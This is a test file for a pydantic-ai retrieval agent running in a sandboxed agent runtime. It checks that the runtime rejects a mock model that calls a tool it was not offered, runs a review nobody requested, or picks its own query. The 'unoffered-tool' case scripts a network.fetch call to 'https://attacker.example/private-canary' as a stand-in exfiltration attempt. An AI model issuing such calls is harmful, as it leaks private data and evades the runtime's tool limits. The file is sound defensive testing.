// SPDX-FileCopyrightText: 2026 Nguyễn Xuân Vĩnh
// SPDX-License-Identifier: AGPL-3.0-only

import { createPyodideAdapter } from '@galaxie/adapter-pyodide';
import { createRuntime, type RunEvent } from '@galaxie/core';
import { MockChatModel, type MockScriptEntry } from '@galaxie/models/mock';
import type { BindToolsInput } from '@langchain/core/language_models/chat_models';
import { expect, test } from 'vitest';
import { pydanticAiRagDefinition } from '../src/agent/definition-pydantic-ai.js';
import { reviewRegistry } from '../src/host/review-passages.js';
import { answerDelta } from '../src/host/stream.js';
import { createPythonFixture, pythonWheelsAvailable } from './support/python.node.js';

const passages = [
  { id: 'paris', title: 'France', text: 'Paris is the capital of France.', score: 3 },
  { id: 'lisbon', title: 'Portugal', text: 'Lisbon is the capital of Portugal.', score: 2 },
  { id: 'rome', title: 'Italy', text: 'Rome is the capital of Italy.', score: 1 },
];
const search: MockScriptEntry = {
  id: 'search',
  text: '',
  toolCalls: [
    { id: 'search-call', name: 'search_docs', args: { query: 'capital', mode: 'fulltext', k: 10 } },
  ],
};
const reviewCall: MockScriptEntry = {
  id: 'review',
  text: '',
  toolCalls: [{ id: 'review-call', name: 'review_passages', args: {} }],
};
const cases = [
  'answer',
  'review',
  'unoffered-tool',
  'unrequested-review',
  'model-chosen-query',
  'prompted-retry',
] as const;
class HostileMock extends MockChatModel {
  override bindTools(tools: BindToolsInput[]): MockChatModel {
    return super.bindTools([
      ...tools,
      { type: 'function', function: { name: 'network.fetch@1', parameters: { type: 'object' } } },
    ]);
  }
}
class RecordingMock extends MockChatModel {
  readonly seen: string[] = [];
  override bindTools(tools: BindToolsInput[]): MockChatModel {
    const bound = super.bindTools(tools);
    const stream = bound._streamResponseChunks.bind(bound);
    const generate = bound._generate.bind(bound);
    const record = (messages: { content: unknown }[]): void => {
      this.seen.push(JSON.stringify(messages.map((message) => message.content)));
    };
    bound._streamResponseChunks = (messages, ...rest) => {
      record(messages);
      return stream(messages, ...rest);
    };
    bound._generate = (messages, ...rest) => {
      record(messages);
      return generate(messages, ...rest);
    };
    return bound;
  }
}
test.skipIf(!pythonWheelsAvailable).each(cases)(
  'pydantic-ai RAG on Node Pyodide: %s',
  async (name) => {
    const reviewing = name === 'review';
    const input = {
      question: 'capital',
      mode: 'fulltext' as const,
      ...(reviewing ? { review: true } : {}),
    };
    const prompt = JSON.stringify(input);
    const answer = reviewing ? 'Lisbon [1]. Rome [2].' : 'Paris [1].';
    const script: MockScriptEntry[] =
      name === 'prompted-retry'
        ? [
            { id: 'bad', text: '{"value":"bad"}' },
            { id: 'good', text: '{"value":7}' },
          ]
        : [search, ...(reviewing ? [reviewCall] : []), { id: 'answer', text: answer }];
    if (name === 'unoffered-tool')
      script[1] = {
        id: 'injected',
        text: '',
        toolCalls: [
          {
            id: 'injected',
            name: 'network.fetch@1',
            args: { url: 'https://attacker.example/private-canary' },
          },
        ],
      };
    if (name === 'unrequested-review') script[1] = reviewCall;
    if (name === 'model-chosen-query')
      script[0] = {
        ...search,
        toolCalls: [
          {
            id: 'search-call',
            name: 'search_docs',
            args: { query: 'secret', mode: 'fulltext', k: 10 },
          },
        ],
      };
    const fixture = await createPythonFixture({
      framework: 'pydantic-ai',
      ...(name === 'prompted-retry'
        ? {
            sources: {
              'agent.py': `# SPDX-FileCopyrightText: 2026 Nguyễn Xuân Vĩnh
# SPDX-License-Identifier: AGPL-3.0-only
import json
from pydantic import BaseModel
from pydantic_ai import Agent, PromptedOutput
from galaxie.pydantic_ai import Executor, GalaxieModel
class Answer(BaseModel):
    value: int

def create_agent():
    return Executor(Agent(GalaxieModel('rag.answer'), output_type=PromptedOutput(Answer)), prompt=lambda value: json.dumps(value, separators=(',', ':')))
`,
            },
            module: 'agent',
          }
        : {}),
    });
    const Provider = name === 'unoffered-tool' ? HostileMock : RecordingMock;
    const model = new Provider({ [prompt]: script }, { sequence: 'assistant-turns' });
    const calls: unknown[] = [];
    const runtime = createRuntime({
      appId: 'pydantic-rag-test',
      executors: [createPyodideAdapter(fixture.options)],
      outputSafety: () => 'allow',
    });
    try {
      const instance = await runtime.create(pydanticAiRagDefinition, {
        principalScope: 'fixture',
        agent: fixture.agent,
        services: { chatModels: { mock: model } },
        models: {
          providers: {
            mock: {
              destination: 'in-browser',
              modality: 'text',
              features: ['streaming', 'tool-calling'],
              languages: ['en'],
              pricing: { inputPerToken: 0, outputPerToken: 0 },
            },
          },
          roles: { 'rag.answer': { providers: ['mock'], allow: ['in-browser'], maxTokens: 500 } },
        },
        bindings: {
          'docs.search@1': {
            kind: 'read',
            destination: 'in-browser',
            timeoutMs: 5000,
            concurrency: 1,
            grantScope: 'instance',
            approval: 'none',
            retry: 'none',
            invoke: async (value) => {
              calls.push(value);
              return { passages };
            },
          },
        },
        ui: reviewRegistry.bindings({ surfaces: ['rag-review'] }),
      });
      await instance.prepare();
      const requestCount = fixture.requests.length;
      const { runId } = await instance.start(input);
      const events: RunEvent[] = [];
      for await (const event of instance.events(runId)) {
        events.push(event);
        if (event.type === 'interaction') break;
      }
      if (reviewing) {
        const pending = instance.getSnapshot().run?.pending;
        expect(pending?.props).toEqual({
          passages: passages.map(({ id, title }) => ({ id, title })),
        });
        if (!pending) throw new Error('The review is missing.');
        const receipt = await instance.dispatch({
          ...pending,
          instanceId: instance.instanceId,
          runId,
          action: 'submit',
          payload: { keptIds: ['lisbon', 'rome'] },
        });
        expect(receipt.status).toBe('accepted');
        events.length = 0;
        for await (const event of instance.events(runId)) events.push(event);
      }
      expect(fixture.requests).toHaveLength(requestCount);
      if (
        name === 'unoffered-tool' ||
        name === 'unrequested-review' ||
        name === 'model-chosen-query'
      ) {
        expect(instance.getSnapshot().run?.status).toBe('failed');
        expect(instance.getSnapshot().run?.pending).toBeUndefined();
        expect(instance.getSnapshot().run?.error).toMatchObject({ code: 'invalid' });
        expect(
          events.some((event) => event.type === 'interaction' || event.type === 'output'),
        ).toBe(false);
      } else {
        expect(instance.getSnapshot().run?.status).toBe('succeeded');
        const output = events.find((event) => event.type === 'output');
        if (name === 'prompted-retry') {
          expect(output).toMatchObject({ output: { value: 7 } });
          expect(model.calls).toBe(2);
        } else {
          expect(output).toMatchObject({
            output: {
              answer,
              citations: reviewing
                ? [
                    { marker: 1, passageId: 'lisbon' },
                    { marker: 2, passageId: 'rome' },
                  ]
                : [{ marker: 1, passageId: 'paris' }],
            },
          });
          expect(events.map(answerDelta).join('')).toBe(answer);
          if (reviewing && model instanceof RecordingMock) {
            // The dropped passage's text never reaches a model request; kept text reaches the answer turn.
            expect(model.seen.join('\n')).not.toContain('Paris is the capital of France.');
            expect(model.seen.at(-1)).toContain('Lisbon is the capital of Portugal.');
          }
          expect(instance.getSnapshot().run?.labels).toContain('private-user');
        }
      }
      expect(calls).toEqual(
        name === 'prompted-retry' || name === 'model-chosen-query'
          ? []
          : [{ query: 'capital', mode: 'fulltext', k: 10 }],
      );
    } finally {
      await runtime.dispose();
      await fixture.cleanup();
    }
  },
  30000,
);
